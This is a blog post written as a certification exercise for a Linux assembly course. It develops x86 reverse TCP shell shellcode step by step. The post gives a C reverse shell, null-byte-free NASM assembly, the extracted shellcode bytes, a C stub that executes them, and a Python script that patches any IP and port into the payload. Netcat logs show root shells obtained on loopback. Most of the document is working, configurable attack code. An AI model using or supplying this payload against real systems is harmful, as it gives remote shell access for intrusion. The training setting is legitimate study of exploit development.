<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<title>README</title>
<!-- 2016-12-21 Wed 16:22 -->
<meta  http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta  name="generator" content="Org-mode" />
<meta  name="author" content="Brett Lischalk" />
<style type="text/css">
 <!--/*--><![CDATA[/*><!--*/
  .title  { text-align: center; }
  .todo   { font-family: monospace; color: red; }
  .done   { color: green; }
  .tag    { background-color: #eee; font-family: monospace;
            padding: 2px; font-size: 80%; font-weight: normal; }
  .timestamp { color: #bebebe; }
  .timestamp-kwd { color: #5f9ea0; }
  .right  { margin-left: auto; margin-right: 0px;  text-align: right; }
  .left   { margin-left: 0px;  margin-right: auto; text-align: left; }
  .center { margin-left: auto; margin-right: auto; text-align: center; }
  .underline { text-decoration: underline; }
  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
  p.verse { margin-left: 3%; }
  pre {
    border: 1px solid #ccc;
    box-shadow: 3px 3px 3px #eee;
    padding: 8pt;
    font-family: monospace;
    overflow: auto;
    margin: 1.2em;
  }
  pre.src {
    position: relative;
    overflow: visible;
    padding-top: 1.2em;
  }
  pre.src:before {
    display: none;
    position: absolute;
    background-color: white;
    top: -10px;
    right: 10px;
    padding: 3px;
    border: 1px solid black;
  }
  pre.src:hover:before { display: inline;}
  pre.src-sh:before    { content: 'sh'; }
  pre.src-bash:before  { content: 'sh'; }
  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
  pre.src-R:before     { content: 'R'; }
  pre.src-perl:before  { content: 'Perl'; }
  pre.src-java:before  { content: 'Java'; }
  pre.src-sql:before   { content: 'SQL'; }

  table { border-collapse:collapse; }
  caption.t-above { caption-side: top; }
  caption.t-bottom { caption-side: bottom; }
  td, th { vertical-align:top;  }
  th.right  { text-align: center;  }
  th.left   { text-align: center;   }
  th.center { text-align: center; }
  td.right  { text-align: right;  }
  td.left   { text-align: left;   }
  td.center { text-align: center; }
  dt { font-weight: bold; }
  .footpara:nth-child(2) { display: inline; }
  .footpara { display: block; }
  .footdef  { margin-bottom: 1em; }
  .figure { padding: 1em; }
  .figure p { text-align: center; }
  .inlinetask {
    padding: 10px;
    border: 2px solid gray;
    margin: 10px;
    background: #ffffcc;
  }
  #org-div-home-and-up
   { text-align: right; font-size: 70%; white-space: nowrap; }
  textarea { overflow-x: auto; }
  .linenr { font-size: smaller }
  .code-highlighted { background-color: #ffff00; }
  .org-info-js_info-navigation { border-style: none; }
  #org-info-js_console-label
    { font-size: 10px; font-weight: bold; white-space: nowrap; }
  .org-info-js_search-highlight
    { background-color: #ffff00; color: #000000; font-weight: bold; }
  /*]]>*/-->
</style>
<script type="text/javascript">
/*
@licstart  The following is the entire license notice for the
JavaScript code in this tag.

Copyright (C) 2012-2013 Free Software Foundation, Inc.

The JavaScript code in this tag is free software: you can
redistribute it and/or modify it under the terms of the GNU
General Public License (GNU GPL) as published by the Free Software
Foundation, either version 3 of the License, or (at your option)
any later version.  The code is distributed WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.

As additional permission under GNU GPL version 3 section 7, you
may distribute non-source (e.g., minimized or compacted) forms of
that code without the copy of the GNU GPL normally required by
section 4, provided you include this license notice and a URL
through which recipients can access the Corresponding Source.


@licend  The above is the entire license notice
for the JavaScript code in this tag.
*/
<!--/*--><![CDATA[/*><!--*/
 function CodeHighlightOn(elem, id)
 {
   var target = document.getElementById(id);
   if(null != target) {
     elem.cacheClassElem = elem.className;
     elem.cacheClassTarget = target.className;
     target.className = "code-highlighted";
     elem.className   = "code-highlighted";
   }
 }
 function CodeHighlightOff(elem, id)
 {
   var target = document.getElementById(id);
   if(elem.cacheClassElem)
     elem.className = elem.cacheClassElem;
   if(elem.cacheClassTarget)
     target.className = elem.cacheClassTarget;
 }
/*]]>*///-->
</script>
</head>
<body>
<div id="content">
<h1 class="title">README</h1>
<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#sec-1">1. Assignment 2</a>
<ul>
<li><a href="#sec-1-1">1.1. Requirements</a></li>
<li><a href="#sec-1-2">1.2. Strategy</a></li>
<li><a href="#sec-1-3">1.3. The Source Code</a></li>
<li><a href="#sec-1-4">1.4. The C progam</a></li>
<li><a href="#sec-1-5">1.5. Analysis of the C progam</a></li>
<li><a href="#sec-1-6">1.6. Assembly: Take 1</a></li>
</ul>
</li>
</ul>
</div>
</div>
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1"><span class="section-number-2">1</span> Assignment 2</h2>
<div class="outline-text-2" id="text-1">
<p>
This blog post has been created for completing the requirements for the SecurityTube
Linux Assembly Expert certification:
<a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert"><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert</a></a>
</p>

<p>
Student ID: SLAE-824
</p>
</div>

<div id="outline-container-sec-1-1" class="outline-3">
<h3 id="sec-1-1"><span class="section-number-3">1.1</span> Requirements</h3>
<div class="outline-text-3" id="text-1-1">
<ul class="org-ul">
<li>Create a Shell Reverse TCP shellcode
<ul class="org-ul">
<li>Reverse connects to configured IP and PORT
</li>
<li>Execs Shell on successful connection
</li>
</ul>
</li>
<li>IP and Port should be easily configurable
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-1-2" class="outline-3">
<h3 id="sec-1-2"><span class="section-number-3">1.2</span> Strategy</h3>
<div class="outline-text-3" id="text-1-2">
<p>
My approach to building a tcp reverse shell shellcode will be to:
</p>

<ul class="org-ul">
<li>Build off of our TCP bind shell developed in <a href="http://www.brettlischalk.com/posts/slae-problem-1-tcp-bind-shell-shellcode">Assignment 1</a> of the SLAE
</li>
<li>Modify the C program to call <code>connect</code> instead of <code>bind</code>, <code>listen</code>, and <code>accept</code>
</li>
<li>Analyze the C program system calls to see how the program interacts with the kernel to accomplish its tasks
</li>
<li>Lookup the system calls and see what arguments and structures they take
</li>
<li>Attempt to write some assembly that calls the same system calls in the same order with the same arguments as the C program does
</li>
<li>Debug issues as of course there will be :)
</li>
</ul>
</div>
</div>


<div id="outline-container-sec-1-3" class="outline-3">
<h3 id="sec-1-3"><span class="section-number-3">1.3</span> The Source Code</h3>
<div class="outline-text-3" id="text-1-3">
<p>
The source code and tools referenced in this article can be found here:
</p>
</div>
</div>

<div id="outline-container-sec-1-4" class="outline-3">
<h3 id="sec-1-4"><span class="section-number-3">1.4</span> The C progam</h3>
<div class="outline-text-3" id="text-1-4">
<div class="org-src-container">

<pre class="src src-c" id="reversetcpshell.c">#include &lt;stdio.h&gt;
#include &lt;netinet/in.h&gt;
#define PORT 4444

int main(int argc, char **argv) {
  // Create a socket
  int lsock = socket(AF_INET, SOCK_STREAM, 0);

  // Setup servr side config struct
  // We configure:
  // The family:IPv4
  // The interface: 127.0.0.1 (Loopback)
  // The port: port#
  struct sockaddr_in config;
  config.sin_family = AF_INET;
  config.sin_addr.s_addr = inet_addr("127.0.0.1");
  // The htons() function converts the
  // unsigned short integer hostshort from host byte
  // order to network byte order.
  config.sin_port = htons(PORT);

  // Connect to listening server
  int csock = connect(lsock, (struct sockaddr *) &amp;config, sizeof(config));

  // Redirect stdin, stdout, and stderror
  dup2(lsock, 0);
  dup2(lsock, 1);
  dup2(lsock, 2);

  // Execute a shell
  execve("/bin/sh", NULL, NULL);
};
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-1-5" class="outline-3">
<h3 id="sec-1-5"><span class="section-number-3">1.5</span> Analysis of the C progam</h3>
<div class="outline-text-3" id="text-1-5">
<p>
Let's compile our program with <code>gcc reversetcpshell.c -o reversetcpshell</code>.
Next, lets start Netcat listening for a connection using <code>nc -nlvp 4444</code>.
Now that we have Netcat waiting for a connection we can go ahead and
execute our reverse tcp shell with <code>./reversetcpshell</code>. If we look over
at our Netcat terminal we will see that we have a received a connection
and been presented with a shell!
</p>

<div class="org-src-container">

<pre class="src src-bash">root@blahblah:~/shared/SLAE/slae/exercise2# nc -nlvp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37260
ls
README.org
reversetcpshell
reversetcpshell.c
</pre>
</div>

<p>
Once again, if we use <code>strace ./reversetcpshell</code> when starting the reverse
shell we can see the system calls being made:
</p>

<div class="org-src-container">

<pre class="src src-bash">socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
dup2(3, 0)                              = 0
dup2(3, 1)                              = 1
dup2(3, 2)                              = 2
connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
execve("/bin/sh", [0], [/* 0 vars */])  = 0
</pre>
</div>

<p>
Interestingly, our c program is shorter and the amount of system calls
that we need seems to have decreased. It seems as though our reverse
tcp shellcode could be as basic as using <code>socket, dup2, connect, and execve</code>.
Essentially we do not need to worry about <code>bind, listen, or accept</code> and
just need to learn about 1 system call we haven't used before; <code>connect</code>.
</p>

<p>
Ok, what can we learn about connect?
</p>


<div class="org-src-container">

<pre class="src src-c">int connect(int socket, const struct sockaddr *address, socklen_t address_len);
</pre>
</div>

<p>
If we remember the function signature of bind:
</p>

<div class="org-src-container">

<pre class="src src-c">int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
</pre>
</div>

<p>
We see that they are exactly the same! The only difference is that when
we define the sockaddr structure we will want to specify the IP of the
machine that we want to connect back to instead of the 0.0.0.0 IP we
specified in our bindshell.
</p>

<p>
Cool! Lets write some assembly&#x2026;
</p>
</div>
</div>

<div id="outline-container-sec-1-6" class="outline-3">
<h3 id="sec-1-6"><span class="section-number-3">1.6</span> Assembly: Take 1</h3>
<div class="outline-text-3" id="text-1-6">
<p>
If we remember our research on  creating our bindshell,
the system call for <code>SYS_CONNECT</code> was 3.
</p>

<div class="org-src-container">

<pre class="src src-C" id="net.h">#define SYS_CONNECT 3   /* sys_connect(2)   */
</pre>
</div>

<p>
So in theory, if we modify our assembly to call 3 instead of 2 e.g
<code>connect</code> instead of <code>bind</code>, remove unnecessary system calls, and make
sure that we redirect stdin,stdout,and stderror after making our
connection, we should be in good shape. Lets give that a shot:
</p>

<div class="org-src-container">

<pre class="src src-nasm" id="reverseshellasm.nasm">global _start

section .text
  _start:
    ;; Create a socket
    ;; int socketcall(int call, unsigned long *args);
    ;; int socket(int domain, int type, int protocol);
    ;; #define SYS_SOCKET 1   /* sys_socket(2)    */
    ;; Use socketcall to call down to socket
    xor eax, eax
    mov al, 0x66 ; socketcall syscall
    xor ebx, ebx
    mov bl, 0x1 ; sys_socket syscall number

    ;; Put the socket() args on the stack
    xor ecx, ecx
    push ecx ; Protocol INADDR_ANY Accept on any interface 0x00000000
    push ebx ; SOCK_STREAM is the type of socket 1

    push 0x2 ; Domain af_inet sets protocol family to ip protocol 2

    mov ecx, esp ; save pointer to args for the socket() call
    int 0x80 ; call sys_socket

    ; save the returned listening socket file descriptor
    xor edi, edi
    mov edi, eax

    ;; Connect on the socket
    xor eax, eax
    mov al, 0x66 ; socketcall syscall

    ;; Start building the sockaddr_in structure
    ;; Since the structure is laid out as:
    ;; sin_family, sin_port, sin_addr
    ;; we need to push the values onto the stack
    ;; in reverse order
    ;; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    ;; sin_addr= inet_addr("127.0.0.1) = 0x0100007f
    ;; loop back addr is 127.0.0.1
    ;; this translates to 0x0100007f
    ;; we don't want to have null bytes 0x00
    ;; so we add 0x01010101 to our address
    ;; move it into a register
    ;; and then subtract
    xor ecx, ecx
    mov ecx, 0x02010180
    sub ecx, 0x01010101
    push ecx ; inet_addr("127.0.0.1) = 0x0100007f

    ;; 4444 is 0x115c in little endian. Network byte order is
    ;; Big endian so we swap the byte ordering
    push word 0x5c11 ; sin_port=4444 (network byte order)
    ;; bl is sys_connect syscallnumber 0x3
    ;; prior to the next instruction
    ;; subtract one to bring it to 0x2
    ;; which is what AF_INET represents
    inc ebx
    push word bx     ; sin_family=AF_INET (0x2)
    mov ecx, esp     ; move pointer to sockaddr_in structure


    ;; In the initial code we use sizeof to derive the addrlen
    ;; If we print the results of that we get 0x10 which is 16 bytes
    push 0x10 ;addrlen=16
    push ecx  ;sockaddr_in struct pointer
    push edi  ;sockfd
    mov ecx, esp ;save pointer to connect() args

    ;; Bring ebx back to sys_call # 3 for connect()
    inc ebx
    int 0x80 ; call sys_connect

    ;; call dup2 for stdin, stdout, and stderr in a loop
    xor ecx, ecx
    mov cl, 0x2 ;loop counter
    xor eax, eax
  dup2:
    mov al, 0x3f ;dup2
    int 0x80
    dec ecx
    jns dup2

    ;; Call execve
    xor eax, eax
    mov al, 0xb ;execve
    xor ebx, ebx
    push ebx
    push 0x68732f2f ;"sh//"
    push 0x6e69622f ;"nib/"
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
</pre>
</div>

<p>
When we compile the above shellcode using the compile.sh script below:
</p>

<div class="org-src-container">

<pre class="src src-sh" id="compile.sh">#!/bin/bash
echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -o $1 $1.o

echo '[+] Done!'
</pre>
</div>

<p>
<code>root@blahblah:~/shared/SLAE/slae/exercise2# ./compile.sh reverseshellasm</code>
</p>

<p>
Setup a netcat listener with <code>nc -nlvp 4444</code> and run the shellcode using:
</p>

<p>
<code>root@blahblah:~/shared/SLAE/slae/exercise1# ./reverseshellasm</code>
</p>

<p>
We receive:
</p>

<div class="org-src-container">

<pre class="src src-bash" id="netcat-reverse-connection">#!/bin/bash
root@blahblah:~/shared/SLAE/slae/exercise2# nc -nlvp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37306
id
uid=0(root) gid=0(root) groups=0(root)
</pre>
</div>

<p>
Excellent! Lets dump the bytes:
</p>

<div class="org-src-container">

<pre class="src src-sh">root@funos:~/shared/SLAE/slae/exercise2# objdump -d ./reverseshellasm|grep '[0-9a-f]:'| \
grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|\
tr '\t' ' ' |sed 's/ $//g'|sed 's/ /\\x/g'|\
paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1"
"\xcd\x80\x31\xff\x89\xc7\x31\xc0\xb0\x66\x31\xc9\xb9\x80\x01\x01"
"\x02\x81\xe9\x01\x01\x01\x01\x51\x66\x68\x11\x5c\x43\x66\x53\x89"
"\xe1\x6a\x10\x51\x57\x89\xe1\x43\xcd\x80\x31\xc9\xb1\x02\x31\xc0"
"\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
</pre>
</div>


<p>
and try it in our shellcode.c stub program.
</p>

<div class="org-src-container">

<pre class="src src-C" id="shellcode.c">#include&lt;stdio.h&gt;
#include&lt;string.h&gt;

unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1"
"\xcd\x80\x31\xff\x89\xc7\x31\xc0\xb0\x66\x31\xc9\xb9\x80\x01\x01"
"\x02\x81\xe9\x01\x01\x01\x01\x51\x66\x68\x11\x5c\x43\x66\x53\x89"
"\xe1\x6a\x10\x51\x57\x89\xe1\x43\xcd\x80\x31\xc9\xb1\x02\x31\xc0"
"\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80";


main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

  int (*ret)() = (int(*)())code;

  ret();

}
</pre>
</div>

<p>
<code>gcc shellcode.c -o shellcode</code>
</p>

<p>
It still works at a length of 96 bytes:
</p>

<div class="org-src-container">

<pre class="src src-bash">root@blahblah:~/shared/SLAE/slae/exercise2# nc -nlvp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37310
id
uid=0(root) gid=0(root) groups=0(root)
</pre>
</div>

<p>
So once again, we can always go back and optimize length but the
last thing we need to do is write another wrapper program which
will allow us to set the IP and PORT easily. Lets use our previous
python script as a starting point. We need to remember though that
whatever IP address a user enters that we want to increment each
octet so the math in the assembly works out:
</p>

<p>
#+NAME reverse-shell.py
</p>
<div class="org-src-container">

<pre class="src src-python">#!/usr/bin/python

import sys,socket

if len(sys.argv) != 3:
  print "Fail!"

ipbts           = bytearray(socket.inet_aton(sys.argv[1]))
incremented     = [b+1 for b in ipbts]
ip              = "".join(["\\x" + format(b, 'x') for b in incremented])
port_number     = int(sys.argv[2])
bts             = [port_number &gt;&gt; i &amp; 0xff for i in (24,16,8,0)]
filtered        = [b for b in bts if b &gt; 0]
formatted       = ["\\x" + format(b, 'x') for b in filtered]
port            = "".join(formatted)

shellcode ="\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x01\\x31\\xc9\\x51\\x53\\x6a\\x02\\x89\\xe1"
shellcode+="\\xcd\\x80\\x31\\xff\\x89\\xc7\\x31\\xc0\\xb0\\x66\\x31\\xc9\\xb9"
print("Ip is: ")
print(ip)
shellcode+= ip # "\\x80\\x01\\x01\\x02"
shellcode+="\\x81\\xe9\\x01\\x01\\x01\\x01\\x51\\x66\\x68"
print("Port is: ")
print(port)
shellcode+= port
shellcode+="\\x43\\x66\\x53\\x89"
shellcode+="\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\x43\\xcd\\x80\\x31\\xc9\\xb1\\x02\\x31\\xc0"
shellcode+="\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\xb0\\x0b\\x31\\xdb\\x53\\x68\\x2f"
shellcode+="\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80";

print(shellcode)
</pre>
</div>

<p>
Pop it in our shellcode.c program again:
</p>

<p>
#+NAME shellcode.c
</p>
<div class="org-src-container">

<pre class="src src-c">#include&lt;stdio.h&gt;
#include&lt;string.h&gt;

unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1"
"\xcd\x80\x31\xff\x89\xc7\x31\xc0\xb0\x66\x31\xc9\xb9\x80\x1\x1\x2"
"\x81\xe9\x01\x01\x01\x01\x51\x66\x68\x11\x5c\x43\x66\x53\x89\xe1"
"\x6a\x10\x51\x57\x89\xe1\x43\xcd\x80\x31\xc9\xb1\x02\x31\xc0\xb0"
"\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f"
"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80";

main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

  int (*ret)() = (int(*)())code;

  ret();

}
</pre>
</div>

<p>
Setup our netcat listener and:
</p>

<div class="org-src-container">

<pre class="src src-bash">root@funos:~/shared/SLAE/slae/exercise2# nc -nlvp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37311
id
uid=0(root) gid=0(root) groups=0(root)
</pre>
</div>

<p>
Presto! We have a reverse shell connection!
</p>
</div>
</div>
</div>
</div>
<div id="postamble" class="status">
<p class="author">Author: Brett Lischalk</p>
<p class="date">Created: 2016-12-21 Wed 16:22</p>
<p class="creator"><a href="http://www.gnu.org/software/emacs/">Emacs</a> 24.5.1 (<a href="http://orgmode.org">Org</a> mode 8.2.10)</p>
<p class="validation"><a href="http://validator.w3.org/check?uri=referer">Validate</a></p>
</div>
</body>
</html>
